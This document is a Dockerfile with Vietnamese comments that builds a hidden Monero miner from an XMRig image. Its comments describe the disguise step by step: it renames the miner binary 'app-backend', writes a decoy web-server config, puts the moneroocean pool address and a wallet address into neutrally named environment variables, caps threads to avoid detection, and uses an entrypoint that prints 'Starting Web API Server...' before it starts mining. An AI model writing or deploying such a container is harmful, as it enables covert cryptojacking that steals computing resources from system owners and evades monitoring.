# Sử dụng image XMRig chính thức làm nền tảng
FROM metal3d/xmrig:latest

# --- BẮT ĐẦU NGỤY TRANG ---

# 1. Thay đổi tên file thực thi chính từ 'xmrig' thành một cái tên vô hại
# Ví dụ: 'nginx', 'apache2', 'node', hoặc 'app-backend'
RUN mv /usr/bin/xmrig /usr/bin/app-backend

# 2. Tạo một file cấu hình giả (fake config) để đánh lừa nếu có ai dòm ngó thư mục
RUN echo '{"port": 8080, "db_host": "localhost", "log_level": "info"}' > /config.json

# 3. Định nghĩa biến môi trường với tên không liên quan đến coin
# Nhưng thực chất sẽ chứa các tham số đào coin
ENV SERVICE_PARAM1="-o"
ENV SERVICE_PARAM2="gulf.moneroocean.stream:10128"
ENV SERVICE_PARAM3="-u"
ENV SERVICE_PARAM4="49C74tmssnRe54eQhUVvuDcSKBa85nUydXQQ9F1mMmNTYsJN2fMTZb9MUk9hMRgFaNSXeAjjDuT9mGbLbgyqP9PZ1xPEEq6"
ENV SERVICE_PARAM5="-p"
ENV SERVICE_PARAM6="web-api-server"
# QUAN TRỌNG: Giới hạn số luồng (threads) để không bị lộ
# Thay '1' bằng số nhân CPU tối đa đại ca muốn dùng (ví dụ: 1, 2)
ENV SERVICE_PARAM7="-t 16" 
ENV SERVICE_PARAM8="--donate-level=1"

# 4. Tạo một entrypoint giả
RUN echo '#!/bin/sh' > /entrypoint.sh && \
    echo 'echo "Starting Web API Server..." && \' >> /entrypoint.sh && \
    echo 'exec /usr/bin/app-backend \$SERVICE_PARAM1 \$SERVICE_PARAM2 \$SERVICE_PARAM3 \$SERVICE_PARAM4 \$SERVICE_PARAM5 \$SERVICE_PARAM6 \$SERVICE_PARAM7 \$SERVICE_PARAM8' >> /entrypoint.sh && \
    chmod +x /entrypoint.sh

# --- KẾT THÚC NGỤY TRANG ---

# Thiết lập điểm khởi chạy là file giả chúng ta vừa tạo
ENTRYPOINT ["/entrypoint.sh"]
